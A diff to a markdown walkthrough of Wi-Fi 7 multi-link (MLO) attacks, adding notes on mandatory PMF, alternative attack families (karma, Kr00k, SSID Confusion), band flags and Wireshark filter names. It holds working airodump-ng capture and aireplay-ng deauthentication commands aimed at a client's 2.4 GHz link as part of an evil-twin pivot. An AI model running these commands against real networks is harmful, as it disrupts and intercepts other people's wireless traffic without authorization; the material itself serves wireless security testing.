@@ -1,14 +1,29 @@
 # Wi-Fi 7 (MLO) — walkthrough
 
+**Verified against:** IEEE Std 802.11be-2024 as of 2026-Q3
+
 MLO attacks are frontier — the corpus tracks published primitives as
 they appear. What follows is the 2024–2026 baseline: reconnaissance,
 link-desync trigger, and the practical evil-twin-per-link pivot that
 works today even without a novel MLO CVE in hand.
 
+## PMF-required baseline
+
+Per WFA Wi-Fi 7 certification, all Wi-Fi 7 operation mandates PMF.
+Deauth against an MLO client is a no-op — the MLD authenticates
+management frames on every link. Reach for the karma-family cold-start,
+Kr00k tail decrypt, or SSID Confusion / FT reassoc capture instead.
+
+The Path B deauth-based probe below is retained only as a diagnostic
+against non-conforming stacks; against a spec-compliant Wi-Fi 7 client
+it will fail silently.
+
 ## Path A — Enumerate the MLD
 
 ```
 # passive capture across 2.4 + 5 (+ 6 if radio permits)
+# --band abg = 2.4 + 5 GHz only. For 6 GHz include `e` (--band abge)
+# AND use a 6 GHz-capable radio (see wifi6-6e/walkthrough.md).
 airodump-ng --band abg -w /tmp/mlo wlan1mon
 
 # find EHT beacons — IE 255 ext ID 108 (EHT Capabilities)
@@ -33,7 +48,9 @@ per-link state (packet-number counters, block-ack windows).
 ```
 # 1. Confirm the client is associated on multiple links.
 #    Look for the Basic Multi-Link element in its (Re)Association Request.
-#    Wireshark: wlan.ml.control.type == 0
+#    Wireshark 4.2+: wlan.eht.multi_link.control.type == 0
+#    Wireshark 4.0/4.1 (older dissector): wlan.ml.control.type == 0
+#    The field name changed with the EHT dissector rework; grep both.
 #
 # 2. Deauth ONLY on the 2.4 GHz link (the weaker one, easier to reach).
 aireplay-ng -0 3 -a AP_BSSID_24 -c CLIENT_LINK_MAC_24 wlan1mon
